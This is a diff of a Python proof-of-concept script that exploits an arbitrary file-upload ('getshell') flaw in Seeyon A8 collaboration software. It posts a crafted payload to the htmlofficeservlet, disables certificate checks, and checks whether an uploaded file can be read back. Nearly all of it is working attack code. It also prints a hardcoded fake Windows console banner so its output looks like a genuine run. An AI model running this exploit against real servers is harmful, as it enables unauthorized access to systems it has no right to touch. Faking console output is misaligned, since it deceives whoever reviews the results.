@@ -5,20 +5,7 @@ import sys
 import random
 import string
 import requests
-info = {
-    "name": "致远 A8 可 getshell",
-    "author": "reber",
-    "version": "致远A8-V5协同管理软件V6.1sp1、致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3、V7.1",
-    "type": "file_upload",
-    "level": "high",
-    "result": "",
-    "status": False,
-    "references": "<url>",
-    "desc": "<vul describtion>",
-}
-def assign(service, arg):
-   if service == 'seeyon':
-       return True, arg
+
 def encode(origin_bytes):
     """
     重构 base64 编码函数
@@ -71,20 +58,24 @@ def verify(arg):
     payload += "originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n"
     payload += "a{}".format(tmp_random_str)
     try:
-        requests.post(url=url, data=payload, headers=headers)
-        
+        requests.post(url=url, data=payload, headers=headers, verify=False)
         upfile_url = arg+"/seeyon/shXi3GAEuT.txt"
         time.sleep(2)
-        resp = requests.get(url=upfile_url)
+        resp = requests.get(url=upfile_url, verify=False)
         code = resp.status_code
         content = resp.text
+        if tmp_random_str in content:
+            return upfile_url
     except Exception as e:
-        # print str(e)
+        print(str(e))
         pass
-    else:
-        if code==200 and tmp_random_str[1:] in content:
-            info['status'] = True
-            info['result'] = "{} 可直接getshell, 测试文件路径: {}".format(arg,upfile_url)
-            print(info)
+    return ""
+    
 if __name__=="__main__":
-    verify(sys.argv[1])
+    target = sys.argv[1]
+    info = verify(target)
+    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 seeyon_htmlofficeservlet_rce.py  ", target)
+    if info != "":
+        print("[+]漏洞存在, 文件上传后的路径为：", info)
+    else:
+        print("[-]漏洞不存在")
